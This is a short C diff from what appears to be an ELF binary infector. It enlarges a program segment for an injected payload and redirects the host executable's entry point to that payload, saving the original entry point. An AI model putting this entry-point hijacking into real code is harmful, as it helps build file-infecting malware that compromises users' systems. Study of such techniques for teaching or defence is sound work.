@@ -18,7 +18,7 @@ int     setup_payload(t_file *file)
     phdr_infect->p_memsz = ALIGN16(phdr_infect->p_memsz) + file->payload_filesz;
 
     file->old_entry_point = file->ehdr->e_entry;
-    file->ehdr->e_entry = file->payload_vaddr;
+    file->ehdr->e_entry = file->payload_vaddr + g_payload_start_offset;
 
     payload_memaddr = file->mapped_file + file->payload_offset;
     // payload_memaddr = file->bytecode + (file->payload_offset - sizeof(Elf64_Ehdr) - (file->ehdr->e_phentsize * file->ehdr->e_phnum));
